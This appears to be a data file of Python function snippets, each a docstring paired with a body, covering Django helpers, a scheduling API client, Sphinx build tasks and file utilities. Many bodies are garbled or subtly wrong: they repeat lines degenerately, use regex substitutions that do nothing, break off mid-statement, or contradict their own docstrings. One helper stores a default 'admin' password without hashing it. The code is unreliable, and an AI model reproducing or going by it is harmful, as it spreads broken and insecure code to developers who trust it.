        "def get_url(self, obj):\n        \"\"\"Determine the URL corresponding to Python object\"\"\"\n        if isinstance(obj, (list, tuple)):\n            return self.get_url_list(obj)\n        elif isinstance(obj, dict):\n            return self.get_url_dict(obj)\n        else:\n            return self.get_url_object(obj)",
        "def syncdb(self, force=False):\n        \"\"\"Update the database with model schema. Shorthand for `paver manage syncdb`.\"\"\"\n        self.db.syncdb(force=force)",
        "def run_server(options):\n    \"\"\"Run the dev server.\n\n    Uses `django_extensions <http://pypi.python.org/pypi/django-extensions/0.5>`, if\n    available, to provide `runserver_plus`.\n\n    Set the command to use with `options.paved.django.runserver`\n    Set the port to use with `options.paved.django.runserver_port`\n    \"\"\"\n    if not options.paved.django.runserver:\n        return\n\n    if options.paved.django.runserver_port:\n        port = options.paved.django.runserver_port\n    else:\n        port = options.paved.django.runserver_plus_port\n\n    command = options.paved.django.runserver\n    if command:\n        command = command.split('",
        "def run_schemamigration(self):\n        \"\"\"Run South's schemamigration command.\"\"\"\n        if self.schemamigration_command:\n            self.schemamigration_command.run()\n        else:\n            print(\"South's schemamigration command is not available.\")",
        "def validate_bio_map_mapper(bio_map_mapper):\n        \"\"\"\n        This static method validates a BioMapMapper definition.\n        It returns None on success and throws an exception otherwise.\n        \"\"\"\n        if not isinstance(bio_map_mapper, BioMapMapper):\n            raise ValueError(\"bio_map_mapper must be an instance of BioMapMapper\")\n        if not bio_map_mapper.name:\n            raise ValueError(\"bio_map_mapper must have a name\")\n        if not bio_map_mapper.description:\n            raise ValueError(\"bio_map_mapper must have a description\")\n        if not bio_map_mapper.input_file:\n            raise ValueError(\"bio_map_mapper must have a input_file\")\n        if not bio_map_mapper.output_file:\n            raise ValueError(\"bio_map_mapper must have a output_file\")\n",
        "def map(self, ID_s, FROM=None, TO=None, target_as_set=False, no_match_sub=None):\n        \"\"\"\n        The main method of this class and the essence of the package.\n        It allows to \"map\" stuff.\n\n        Args:\n\n            ID_s: Nested lists with strings as leafs (plain strings also possible)\n            FROM (str): Origin key for the mapping (default: main key)\n            TO (str): Destination key for the mapping (default: main key)\n            target_as_set (bool): Whether to summarize the output as a set (removes duplicates)\n            no_match_sub: Object representing the status of an ID not being able to be matched\n                          (default: None)\n\n        Returns:\n\n            Mapping: a mapping object capturing the result of the mapping request\n        \"\"\"\n        if",
        "def get_data_entries(self, key='main'):\n        \"\"\"\n        Returns all data entries for a particular key. Default is the main key.\n\n        Args:\n\n            key (str): key whose values to return (default: main key)\n\n        Returns:\n\n            List of all data entries for the key\n        \"\"\"\n        return [self.get_data_entry(key=key) for key in self.get_data_keys()]",
        "def _split_line(self, line):\n        \"\"\"\n        Returns list of strings split by input delimeter\n\n        Argument:\n        line - Input line to cut\n        \"\"\"\n        line = line.strip()\n        if line == '':\n            return []\n        return line.split(self.delimeter)",
        "def get_existing_message(self, message_id):\n        \"\"\"Get Existing Message\n\n        http://dev.wheniwork.com/#get-existing-message\n        \"\"\"\n        return self._get(self.api_url + \"/messages/%s\" % message_id,\n                         headers=self.headers)",
        "def create(self, message, **kwargs):\n        \"\"\"\n        Creates a message\n\n        http://dev.wheniwork.com/#create/update-message\n        \"\"\"\n        return self._post(self.endpoint.create, message, **kwargs)",
        "def update_message(self, message_id, **kwargs):\n        \"\"\"Modify an existing message.\n\n        http://dev.wheniwork.com/#create/update-message\n        \"\"\"\n        return self._create_put_request(\n            resource=MESSAGES,\n            billomat_id=message_id,\n            kwargs=kwargs\n        )",
        "def delete_messages(self, *args, **kwargs):\n        \"\"\"Delete existing messages.\n\n        http://dev.wheniwork.com/#delete-existing-message\n        \"\"\"\n        return self._delete(self.messages_url, args, kwargs)",
        "def get_site(self, site_id):\n        \"\"\"\n        Returns site data.\n\n        http://dev.wheniwork.com/#get-existing-site\n        \"\"\"\n        url = self.base_url + '/sites/' + site_id\n        return self.get_request(url)",
        "def sites(self):\n        \"\"\"\n        Returns a list of sites.\n\n        http://dev.wheniwork.com/#listing-sites\n        \"\"\"\n        url = self._build_url('sites')\n        return self._get(url)",
        "def create_site(self, name, description, url,\n                     public=False, private=False,\n                     public_url=None, private_url=None,\n                     public_file=None, private_file=None,\n                     public_file_url=None, private_file_url=None,\n                     public_file_url_secure=None, private_file_url_secure=None,\n                     ):\n        \"\"\"\n        Creates a site\n\n        http://dev.wheniwork.com/#create-update-site\n        \"\"\"\n        return self.post(self.site_url, data={\n            'name': name,\n            'description': description,\n            'url': url,\n            'public': public,\n            'private': private,\n            'public_url': public_url,\n            'private_url': private_url,\n           ",
        "def move_up_link(obj, link_text=\"up\"):\n    \"\"\"\n    Returns a link to a view that moves the passed in object up in rank.\n\n    :param obj:\n        Object to move\n    :param link_text:\n        Text to display in the link.  Defaults to \"up\"\n    :returns:\n        HTML link code to view for moving the object\n    \"\"\"\n    return \"<a href='{0}'>{1}</a>\".format(reverse(\"rank:move\", args=[obj.rank, obj.id]), link_text)",
        "def move_down_link(obj, link_text=\"down\"):\n    \"\"\"\n    Returns a link to a view that moves the passed in object down in rank.\n\n    :param obj:\n        Object to move\n    :param link_text:\n        Text to display in the link.  Defaults to \"down\"\n    :returns:\n        HTML link code to view for moving the object\n    \"\"\"\n    return \"<a href='{0}'>{1}</a>\".format(reverse('rank:move', args=[obj.rank, obj.id]), link_text)",
        "def show_figure(fig, orientation='vertical'):\n    \"\"\"Shows a figure with a typical orientation so that x and y axes are set up as expected.\"\"\"\n    fig.set_size_inches(1, 1)\n    fig.subplots_adjust(left=0.05, right=0.95, top=0.95, bottom=0.95)\n    fig.subplots_adjust(left=0.95, right=0.95, top=0.95, bottom=0.95)\n    fig.subplots_adjust(left=0.95, right=0.95, top=0.95, bottom=0.95)\n    fig.subplots_adjust(left=0.95, right=0.95, top=0.95, bottom=0.95)\n    fig.subplots_adjust(left=0.95, right=",
        "def shift_index(index):\n    \"\"\"Shifts indicies as needed to account for one based indexing\n\n    Positive indicies need to be reduced by one to match with zero based\n    indexing.\n\n    Zero is not a valid input, and as such will throw a value error.\n\n    Arguments:\n        index -     index to shift\n    \"\"\"\n    if index < 0:\n        raise ValueError(\"Index must be greater than or equal to 0\")\n    if index > len(index_list):\n        raise ValueError(\"Index must be less than or equal to len(index_list)\")\n    return index - index_list[index]",
        "def _cut_line(self, line):\n        \"\"\"\n        Returns selected positions from cut input source in desired\n        arrangement.\n\n        Argument:\n            line -      input to cut\n        \"\"\"\n        if self.cut_line_start is None:\n            return line\n        else:\n            return line[:self.cut_line_start] + line[self.cut_line_end:]",
        "def process_positions(self, positions):\n        \"\"\"Processes positions to account for ranges\n\n        Arguments:\n            positions -     list of positions and/or ranges to process\n        \"\"\"\n        if not positions:\n            return\n        if self.ranges:\n            for pos in positions:\n                if pos[0] < self.ranges[0][0]:\n                    raise ValueError(\"Position %s is before the start of the range\" % pos)\n                if pos[0] > self.ranges[0][1]:\n                    raise ValueError(\"Position %s is after the end of the range\" % pos)\n                if pos[1] < self.ranges[1][0]:\n                    raise ValueError(\"Position %s is before the start of the range\" % pos)\n                if pos[1] > self.ranges[1][1]:\n                    raise ValueError(\"Position %s is after the end of the",
        "def cut(self, line, start, current_position):\n        \"\"\"\n        Performs cut for range from start position to end\n\n        Arguments:\n            line -              input to cut\n            start -             start of range\n            current_position -  current position in main cut function\n        \"\"\"\n        if line[current_position] == self.cut_char:\n            self.cut_line(line, start, current_position)\n        else:\n            self.cut_line(line, current_position + 1, current_position)",
        "def _range_to_list(self, start, end):\n        \"\"\"\n        Creates list of values in a range with output delimiters.\n\n        Arguments:\n            start -     range start\n            end -       range end\n        \"\"\"\n        if end is None:\n            end = start\n        return [self._range_to_string(start, end)]",
        "def lock(self):\n    \"\"\"Locks the file by writing a '.lock' file.\n       Returns True when the file is locked and\n       False when the file was locked already\n    \"\"\"\n    if not os.path.exists(self.path):\n      return False\n    with open(self.path, 'w') as f:\n      f.write(self.lock_str)\n    return True",
        "def unlock(self):\n    \"\"\"Unlocks the file by remove a '.lock' file.\n       Returns True when the file is unlocked and\n       False when the file was unlocked already\n    \"\"\"\n    if not os.path.exists(self.path):\n      return False\n    if not os.path.isfile(self.path + '.lock'):\n      return False\n    try:\n      os.remove(self.path + '.lock')\n    except OSError:\n      return False\n    return True",
        "def push(self):\n        \"\"\"Initiate the local catalog and push it the cloud\"\"\"\n        self.init()\n        self.push_catalog()\n        self.push_cloud()",
        "def initiate_local_catalog(self):\n        \"\"\"Initiate the local catalog by downloading the cloud catalog\"\"\"\n        self.local_catalog = self.download_cloud_catalog()\n        self.local_catalog_path = os.path.join(self.local_catalog_path, self.local_catalog)\n        self.local_catalog_path = os.path.abspath(self.local_catalog_path)\n        self.local_catalog_path = os.path.expanduser(self.local_catalog_path)\n        self.local_catalog_path = os.path.expandvars(self.local_catalog_path)\n        self.local_catalog_path = os.path.expandvars(self.local_catalog_path)\n        self.local_catalog_path = os.path.expanduser(self.local_catalog_path)\n        self.local",
        "def _get_path(self, a, b):\n        \"\"\"Return nodes in the path between 'a' and 'b' going from\n        parent to child NOT including 'a'\"\"\"\n        if a == b:\n            return []\n        if a == self.root:\n            return [b]\n        if b == self.root:\n            return [a]\n        return [self._get_path(a, b)] + self._get_path(b, a)",
        "def rindex(self, x):\n        \"\"\"Index of the last occurrence of x in the sequence.\"\"\"\n        return self.rfind(x, self.start, self.end)",
        "def create_admin(username='admin', email='admin@admin.com', password='admin'):\n    \"\"\"\n    Create and save an admin user.\n\n    :param username:\n        Admin account's username.  Defaults to 'admin'\n    :param email:\n        Admin account's email address.  Defaults to 'admin@admin.com'\n    :param password:\n        Admin account's password.  Defaults to 'admin'\n    :returns:\n        Django user with staff and superuser privileges\n    \"\"\"\n    user = User(username=username, email=email, password=password)\n    user.is_staff = True\n    user.is_superuser = True\n    user.save()\n    return user",
        "def get_messages(response):\n    \"\"\"\n    Returns a list of the messages from the django MessageMiddleware\n    package contained within the given response.  This is to be used during\n    unit testing when trying to see if a message was set properly in a view.\n\n    :param response: HttpResponse object, likely obtained through a\n        test client.get() or client.post() call\n\n    :returns: a list of tuples (message_string, message_level), one for each\n        message in the response context\n    \"\"\"\n    messages = []\n    for message in response.context['messages']:\n        messages.append((message.message_string, message.level))\n    return messages",
        "def authenticate_superuser(self, username, password):\n        \"\"\"Authenticates the superuser account via the web login.\"\"\"\n        self.authenticate(username, password)\n        self.superuser = True\n        self.save()",
        "def get(self, url, response_code=200, headers=None, follow=False):\n        \"\"\"\n        Does a django test client ``get`` against the given url after\n        logging in the admin first.\n\n        :param url:\n            URL to fetch\n        :param response_code:\n            Expected response code from the URL fetch.  This value is\n            asserted.  Defaults to 200\n        :param headers:\n            Optional dictionary of headers to send in the request\n        :param follow:\n            When True, the get call will follow any redirect requests.\n            Defaults to False.\n        :returns:\n            Django testing ``Response`` object\n        \"\"\"\n        response = self.client.get(url, headers=headers, follow=follow)\n        self.assertEqual(response_code, response.status_code)\n        return response",
        "def post(self, url, data, response_code=200, headers=None):\n        \"\"\"\n        Does a django test client ``post`` against the given url after\n        logging in the admin first.\n\n        :param url:\n            URL to fetch\n        :param data:\n            Dictionary to form contents to post\n        :param response_code:\n            Expected response code from the URL fetch.  This value is\n            asserted.  Defaults to 200\n        :param headers:\n            Optional dictionary of headers to send in with the request\n        :returns:\n            Django testing ``Response`` object\n        \"\"\"\n        response = self.client.post(url, data, headers=headers)\n        self.assertEqual(response_code, response.status_code)\n        return response",
        "def get_field_display(self, admin_model, instance, field_name):\n        \"\"\"\n        Returns the value displayed in the column on the web interface for\n        a given instance.\n\n        :param admin_model:\n            Instance of a :class:`admin.ModelAdmin` object that is responsible\n            for displaying the change list\n        :param instance:\n            Object instance that is the row in the admin change list\n        :field_name:\n            Name of the field/column to fetch\n        \"\"\"\n        field = admin_model._meta.get_field(field_name)\n        return field.display_value(instance)",
        "def high_value(self):\n        \"\"\"Highest value of input image.\"\"\"\n        return np.max(self.data, axis=0, keepdims=True)",
        "def low_value(self):\n        \"\"\"Lowest value of input image.\"\"\"\n        return np.min(self.data, axis=0, keepdims=True)",
        "def spawn_greenlet(func):\n    \"\"\"\n    spawns a greenlet that does not print exceptions to the screen.\n    if you use this function you MUST use this module's join or joinall otherwise the exception will be lost\n    \"\"\"\n    g = greenlet.Greenlet(func)\n    g.start()\n    return g",
        "def _get_usage_string(self):\n        \"\"\"Returns usage string with no trailing whitespace.\"\"\"\n        usage = self.usage\n        if usage:\n            usage = usage.strip()\n        return usage",
        "def setup_parser(parser):\n    \"\"\"Setup argparser to process arguments and generate help\"\"\"\n    parser.add_argument('-v', '--verbose', action='store_true',\n                        help='increase output verbosity')\n    parser.add_argument('-q', '--quiet', action='store_true',\n                        help='increase output verbosity')\n    parser.add_argument('-d', '--debug', action='store_true',\n                        help='increase output verbosity')\n    parser.add_argument('-r', '--remote', action='store_true',\n                        help='run remote tests')\n    parser.add_argument('-t', '--test', action='store_true',\n                        help='run tests')\n    parser.add_argument('-p', '--port', type=int, default=5000,\n                        help='port to run tests on')\n    parser",
        "def _get_s3_bucket_key(self):\n        \"\"\"Opens connection to S3 returning bucket and key\"\"\"\n        if self.s3_bucket_key is None:\n            self.s3_bucket_key = self._get_s3_bucket()\n        return self.s3_bucket_key",
        "def upload_file(self, local_path, bucket_name, key_name):\n        \"\"\"Upload a local file to S3.\"\"\"\n        self.s3.upload_fileobj(local_path, bucket_name, key_name)",
        "def download_file(self, bucket, key, filename):\n        \"\"\"Download a remote file from S3.\"\"\"\n        self.s3.download_fileobj(bucket, key, filename)",
        "def create_ics(self, event):\n        \"\"\"Creates an ical .ics file for an event using python-card-me.\"\"\"\n        # Create the ical file\n        ical = self.create_ical(event)\n\n        # Write the ical file\n        with open(self.ics_file, 'w') as f:\n            f.write(ical)",
        "def get_comments(event):\n    \"\"\"\n    Returns a list view of all comments for a given event.\n    Combines event comments and update comments in one list.\n    \"\"\"\n    comments = Comment.objects.filter(event=event)\n    comments.update(comments_count=comments.count())\n    return comments",
        "def get_updates(event):\n    \"\"\"\n    Returns a list view of updates for a given event.\n    If the event is over, it will be in chronological order.\n    If the event is upcoming or still going,\n    it will be in reverse chronological order.\n    \"\"\"\n    if event.is_over:\n        return sorted(event.updates, key=lambda u: u.timestamp)\n    else:\n        return sorted(event.updates, key=lambda u: u.timestamp, reverse=True)",
        "def event_videos(event):\n    \"\"\"Displays list of videos for given event.\"\"\"\n    videos = event.videos\n    if videos:\n        click.echo(\n            click.style(\n                ' '.join(\n                    [\n                        click.style(\n                            '{0} ({1})'.format(\n                                video.title,\n                                video.duration\n                            )\n                        )\n                        for video in videos\n                    ]\n                ),\n                fg='green',\n            )\n        )\n    else:\n        click.echo('No videos found.')",
        "def add_event_form(self, *args, **kwargs):\n        \"\"\"Public form to add an event.\"\"\"\n        form = self.EventFormClass(*args, **kwargs)\n        self.add_form(form)\n        return form",
        "def add_memory(self, event, memory):\n        \"\"\"Adds a memory to an event.\"\"\"\n        if not isinstance(memory, Memory):\n            raise TypeError(\"memory must be a Memory object\")\n        self.add_event(event, memory)",
        "def insert_library(self, library):\n        \"\"\"Inserts Interpreter Library of imports into sketch in a very non-consensual way\"\"\"\n        if library.name in self.library:\n            raise ValueError(\"Library %s already exists\" % library.name)\n        self.library.append(library)",
        "def set_moments(self, sx, sxp, sxxp):\n        \"\"\"Sets the beam moments directly.\n\n        Parameters\n        ----------\n        sx : float\n            Beam moment where :math:`\\\\text{sx}^2 = \\\\langle x^2 \\\\rangle`.\n        sxp : float\n            Beam moment where :math:`\\\\text{sxp}^2 = \\\\langle x'^2 \\\\rangle`.\n        sxxp : float\n            Beam moment where :math:`\\\\text{sxxp} = \\\\langle x x' \\\\rangle`.\n        \"\"\"\n        self.sx = sx\n        self.sxp = sxp\n        self.sxxp = sxxp",
        "def set_beam_moments_direct(self, beta, alpha, emit, emit_n):\n        \"\"\"Sets the beam moments indirectly using Courant-Snyder parameters.\n\n        Parameters\n        ----------\n        beta : float\n            Courant-Snyder parameter :math:`\\\\beta`.\n        alpha : float\n            Courant-Snyder parameter :math:`\\\\alpha`.\n        emit : float\n            Beam emittance :math:`\\\\epsilon`.\n        emit_n : float\n            Normalized beam emittance :math:`\\\\gamma \\\\epsilon`.\n        \"\"\"\n        self.set_beam_moments(beta, alpha, emit, emit_n)\n        self.set_beam_moments_direct_norm(beta, alpha, emit, emit_n)",
        "def _slice_to_range(slice_obj, length):\n    \"\"\"Given a slice object, return appropriate values for use in the range function\n\n    :param slice_obj: The slice object or integer provided in the `[]` notation\n    :param length: For negative indexing we need to know the max length of the object.\n    \"\"\"\n    if slice_obj is None:\n        return slice(None, None, length)\n    elif isinstance(slice_obj, slice):\n        return slice_obj\n    elif isinstance(slice_obj, int):\n        return slice(slice_obj, slice_obj + length)\n    else:\n        raise TypeError(\"slice_obj must be an integer or a slice object\")",
        "def _add_error(self, error_code, value, **kwargs):\n        \"\"\"\n        Helper to add error to messages field. It fills placeholder with extra call parameters\n        or values from message_value map.\n\n        :param error_code: Error code to use\n        :rparam error_code: str\n        :param value: Value checked\n        :param kwargs: Map of values to use in placeholders\n        \"\"\"\n        self.messages.append(\n            self.error_message(error_code, value, **kwargs)\n        )",
        "def _copy_file_zip(src_path, dst_path):\n    \"\"\"File copy that support compress and decompress of zip files\"\"\"\n    if not os.path.exists(dst_path):\n        os.makedirs(dst_path)\n    if os.path.isdir(src_path):\n        shutil.copytree(src_path, dst_path)\n    else:\n        shutil.copy2(src_path, dst_path)",
        "def apply_changesets(self, catalog, changesets):\n        \"\"\"Apply to the 'catalog' the changesets in the metafile list 'changesets'\"\"\"\n        for changeset in changesets:\n            catalog.append(self.apply_changeset(catalog, changeset))",
        "def validate_event_does_not_exist(self, event_name):\n        \"\"\"Validate that an event with this name on this date does not exist.\"\"\"\n        if event_name in self.events:\n            raise ValueError(\"Event %s already exists\" % event_name)",
        "def loop_in_background(interval, callback, *args, **kwargs):\n    \"\"\"\n    When entering the context, spawns a greenlet that sleeps for `interval` seconds between `callback` executions.\n    When leaving the context stops the greenlet.\n    The yielded object is the `GeventLoop` object so the loop can be stopped from within the context.\n\n    For example:\n    ```\n    with loop_in_background(60.0, purge_cache) as purge_cache_job:\n        ...\n        ...\n        if should_stop_cache():\n            purge_cache_job.stop()\n    ```\n    \"\"\"\n    loop = GeventLoop()\n    try:\n        yield loop\n    finally:\n        loop.stop()",
        "def _main_loop(self):\n        \"\"\"Main loop - used internally.\"\"\"\n        while self._running:\n            try:\n                self._process_queue()\n            except KeyboardInterrupt:\n                self._shutdown()\n                break\n            except Exception as e:\n                self._shutdown()\n                raise e",
        "def start(self):\n        \"\"\"Starts the loop. Calling a running loop is an error.\"\"\"\n        if self.running:\n            raise RuntimeError(\"Cannot start a loop that is already running\")\n        self.running = True\n        self.loop.start()",
        "def kill(self):\n        \"\"\"Kills the running loop and waits till it gets killed.\"\"\"\n        self.stop()\n        self.join()\n        if self.is_alive():\n            raise RuntimeError(\"Loop is still running\")",
        "def plot_xy(x, y, z, ax=None, fig=None, cmap=None, alpha=1.0, scalex=True, scaley=True, add_cbar=True):\n    \"\"\"Used to plot a set of coordinates.\n\n\n    Parameters\n    ----------\n    x, y : :class:`numpy.ndarray`\n        1-D ndarrays of lengths N and M, respectively, specifying pixel centers\n    z : :class:`numpy.ndarray`\n        An (M, N) ndarray or masked array of values to be colormapped, or a (M, N, 3) RGB array, or a (M, N, 4) RGBA array.\n    ax : :class:`matplotlib.axes.Axes`, optional\n        The axis to plot to.\n    fig : :class:`matplotlib.figure.Figure`, optional\n        The figure to plot to.\n",
        "def fix_spacing_errors(self):\n        \"\"\"Fix common spacing errors caused by LaTeX's habit\n        of using an inter-sentence space after any full stop.\n        \"\"\"\n        for line in self.lines:\n            if line.startswith(' '):\n                line = line[1:]\n                if line.endswith(' '):\n                    line = line[:-1]\n                line = line.replace(' ', ' ')\n                self.lines[line] = line",
        "def _hyphen_to_dash(s):\n    \"\"\"Transform hyphens to various kinds of dashes\"\"\"\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s)\n    s = re.sub(r'-', '-', s",
        "def replace(self, target, replacement):\n        \"\"\"Replace target with replacement\"\"\"\n        if target in self.targets:\n            self.targets[target] = replacement",
        "def _substitute(self, target, replacement):\n        \"\"\"Regex substitute target with replacement\"\"\"\n        return re.sub(self.pattern, replacement, target)",
        "def makefile(options):\n    \"\"\"Call the Sphinx Makefile with the specified targets.\n\n    `options.paved.docs.path`: the path to the Sphinx folder (where the Makefile resides).\n    \"\"\"\n    if options.paved.docs.path:\n        makefile_path = os.path.join(options.paved.docs.path, 'Makefile')\n        if not os.path.exists(makefile_path):\n            raise RuntimeError('Makefile does not exist: %s' % makefile_path)\n        with open(makefile_path, 'w') as f:\n            f.write(makefile_template)",
        "def upload_docs(options):\n    \"\"\"Upload the docs to a remote location via rsync.\n\n    `options.paved.docs.rsync_location`: the target location to rsync files to.\n\n    `options.paved.docs.path`: the path to the Sphinx folder (where the Makefile resides).\n\n    `options.paved.docs.build_rel`: the path of the documentation\n        build folder, relative to `options.paved.docs.path`.\n    \"\"\"\n    if options.paved.docs.rsync_location:\n        rsync_location = options.paved.docs.rsync_location\n    else:\n        rsync_location = options.paved.docs.path\n    if options.paved.docs.build_rel:\n        build_rel = options.paved.docs.build_",
        "def push_docs(options):\n    \"\"\"Push Sphinx docs to github_ gh-pages branch.\n\n     1. Create file .nojekyll\n     2. Push the branch to origin/gh-pages\n        after committing using ghp-import_\n\n    Requirements:\n     - easy_install ghp-import\n\n    Options:\n     - `options.paved.docs.*` is not used\n     - `options.sphinx.docroot` is used (default=docs)\n     - `options.sphinx.builddir` is used (default=.build)\n\n    .. warning::\n        This will DESTROY your gh-pages branch.\n        If you love it, you'll want to take backups\n        before playing with this. This script assumes\n        that gh-pages is 100% derivative. You should\n        never edit files in",
        "def open_browser(self):\n        \"\"\"Open your web browser and display the generated html documentation.\"\"\"\n        browser = self.browser\n        browser.open(self.url)\n        self.browser = browser",
        "def _minimize_css_code(css_code):\n    \"\"\"Tries to minimize the length of CSS code passed as parameter. Returns string.\"\"\"\n    if len(css_code) < 1:\n        return css_code\n    if len(css_code) > 1:\n        return css_code[:1] + ' ' + css_code[1:]\n    return css_code",
        "def open_index(self):\n        \"\"\"Return an open file-object to the index file\"\"\"\n        if self.index_file is None:\n            self.index_file = open(self.index_path, 'w')\n        return self.index_file",
        "def create_tasks(self):\n        \"\"\"Create the tasks on the server\"\"\"\n        self.log.info(\"Creating tasks\")\n        self.create_task_list()\n        self.create_task_status()\n        self.create_task_status_history()\n        self.create_task_status_history_history()\n        self.create_task_status_history_history_history()\n        self.create_task_status_history_history_history()\n        self.create_task_status_history_history_history()\n        self.create_task_status_history_history_history()\n        self.create_task_status_history_history_history()\n        self.create_task_status_history_history_history()\n        self.create_task_status_history_history_history()\n        self.create_task_status_history_",
        "def update_tasks(self, tasks):\n        \"\"\"Update existing tasks on the server\"\"\"\n        if not tasks:\n            return\n        for task in tasks:\n            self.update_task(task)",
        "def reconcile(self, server):\n        \"\"\"Reconcile this collection with the server.\"\"\"\n        self.ensure_index()\n        self.ensure_type()\n        self.ensure_unique()\n        self.ensure_index_exists()\n        self.ensure_type_exists()\n        self.ensure_unique_index()\n        self.ensure_unique_type_exists()\n        self.ensure_unique_index_exists()\n        self.ensure_unique_type_exists()\n        self.ensure_unique_index_exists()\n        self.ensure_unique_type_exists()\n        self.ensure_unique_index_exists()\n        self.ensure_unique_type_exists()\n        self.ensure_unique_type_exists()\n        self.ensure_unique_type_exists()\n        self.ensure_unique_type_exists()\n        self.ensure",
        "def yesno(message, default=False):\n    \"\"\"Prompts the user for yes or no.\"\"\"\n    answer = input(message)\n    if answer == '' or answer == 'y':\n        return True\n    else:\n        return default",
        "def _prompt_user(self, message, default=None):\n        \"\"\"Prompts the user with custom options.\"\"\"\n        if default is None:\n            default = self.default\n        return self._prompt(message, default)",
        "def _read_config(self, args):\n        \"\"\"Reading the configure file and adds non-existing attributes to 'args'\"\"\"\n        config = self.config_file\n        if not os.path.exists(config):\n            return\n        with open(config) as f:\n            config = f.read()\n        for line in config.splitlines():\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n            if line.startswith('#'):\n                continue\n",
        "def write_config(self, args):\n        \"\"\"Writing the configure file with the attributes in 'args'\"\"\"\n        with open(self.config_file, 'w') as f:\n            f.write(self.config_template % args)",
        "def createGame(self, mode):\n        \"\"\"\n        Create a new instance of a game. Note, a mode MUST be provided and MUST be of\n        type GameMode.\n\n        :param mode: <required>\n        \"\"\"\n        path = {}\n        data = {}\n        params = {}\n\n        # REQUIRED - PATH - mode\n        \"\"\"ID\"\"\"\n        path[\"mode\"] = mode\n\n        self.logger.debug(\"POST /api/v1/games with query params: %s\", params)\n        return self.generic_request(\"POST\", self.api_base_url + \"/games\", data=data, params=params,\n                                     response_class=Game)",
        "def bump(self, target):\n        \"\"\"Bumps the Version given a target\n\n        The target can be either MAJOR, MINOR or PATCH\n        \"\"\"\n        if target == 'MAJOR':\n            self.major += 1\n        elif target == 'MINOR':\n            self.minor += 1\n        elif target == 'PATCH':\n            self.patch += 1\n        else:\n            raise ValueError('Invalid target: %s' % target)\n        return self",
        "def copy(self):\n        \"\"\"Returns a copy of this object\"\"\"\n        return self.__class__(self.id, self.name, self.description,\n                              self.type, self.default, self.required,\n                              self.required_by, self.required_by_type,\n                              self.required_by_value, self.required_by_default,\n                              self.required_by_default_type,\n                              self.required_by_default_value,\n                              self.required_by_default_type_value,\n                              self.required_by_default_value_type,\n                              self.required_by_default_value_type_value,\n                              self.required_by_default_value_type_value_type,\n                              self.required_by_default_value_type_value_type,\n                              self.required_by_default_value_",
        "def get_tag(self, revision):\n        \"\"\"Returns a Tag with a given revision\"\"\"\n        return Tag(self.repo, self.name, revision, self.sha)",
        "def parse_string(string):\n    \"\"\"Parses a string into a Tag\"\"\"\n    if not string:\n        return Tag()\n    if string.startswith('#'):\n        return Tag(string[1:])\n    if string.startswith('<'):\n        return Tag(string[1:])\n    if string.startswith('<'):\n        return Tag(string[1:])\n    if string.startswith('<'):\n        return Tag(string[1:])\n    if string.startswith('<'):\n        return Tag(string[1:])\n    if string.startswith('<'):\n        return Tag(string[1:])\n    if string.startswith('<'):\n        return Tag(string[1:])\n    if string.startswith('<'):\n        return Tag(string[1:])\n    if",
        "def tiles(self):\n        \"\"\"Tiles open figures.\"\"\"\n        for fig in self.figs:\n            fig.tiles()",
        "def comment_added(self, comment):\n        \"\"\"When a Comment is added, updates the Update to set \"last_updated\" time\"\"\"\n        self.last_updated = datetime.utcnow()\n        self.update()",
        "def get_context(request):\n    \"\"\"\n    Adds useful global items to the context for use in templates.\n\n    * *request*: the request object\n    * *HOST*: host name of server\n    * *IN_ADMIN*: True if you are in the django admin area\n    \"\"\"\n    context = {\n        'request': request,\n        'HOST': request.get_host(),\n        'IN_ADMIN': request.user.is_superuser,\n    }\n    return context",
        "def create_challenge(self, challenge_id, challenge_data):\n        \"\"\"Create the challenge on the server\"\"\"\n        return self.post(self.challenge_path, data=challenge_data,\n                           headers=self.challenge_headers)",
        "def update_challenge(self, challenge_id, challenge):\n        \"\"\"Update existing challenge on the server\"\"\"\n        return self.put(self.challenge_path % (challenge_id), challenge)",
        "def challenge_exists(self, challenge):\n        \"\"\"Check if a challenge exists on the server\"\"\"\n        if self.challenge_exists_raw(challenge):\n            return True\n        else:\n            return False",
        "def get_position(self, position_id):\n        \"\"\"\n        Returns position data.\n\n        http://dev.wheniwork.com/#get-existing-position\n        \"\"\"\n        url = self.base_url + '/v2/positions/' + str(position_id)\n        return self._get(url)",
        "def positions(self):\n        \"\"\"\n        Returns a list of positions.\n\n        http://dev.wheniwork.com/#listing-positions\n        \"\"\"\n        url = self._build_url(self._endpoints.get('positions'))\n        return self._get(url)",
        "def create_position(self, name, latitude, longitude,\n                         latitude_delta=None, longitude_delta=None,\n                         latitude_units=None, longitude_units=None,\n                         latitude_units_delta=None, longitude_units_delta=None,\n                         latitude_units_units_delta=None,\n                         longitude_units_units_delta=None,\n                         latitude_units_units_delta=None,\n                         longitude_units_units_delta=None,\n                         latitude_units_units_delta=None,\n                         longitude_units_units_delta=None,\n                         latitude_units_units_delta=None,\n                         longitude_units_units_delta=None,\n                         latitude_units_units_delta=None,\n                         longitude_units_units_delta=None,\n                         latitude_units_units_delta=None,\n                         longitude_units_units",
        "def pycheck_sloccount_export(options):\n    \"\"\"Print \"Source Lines of Code\" and export to file.\n\n    Export is hudson_ plugin_ compatible: sloccount.sc\n\n    requirements:\n     - sloccount_ should be installed.\n     - tee and pipes are used\n\n    options.paved.pycheck.sloccount.param\n\n    .. _sloccount: http://www.dwheeler.com/sloccount/\n    .. _hudson: http://hudson-ci.org/\n    .. _plugin: http://wiki.hudson-ci.org/display/HUDSON/SLOCCount+Plugin\n    \"\"\"\n    if not options.paved.pycheck.sloccount.installed:\n        raise click.UsageError('sloccount not installed')\n\n    if options.p",
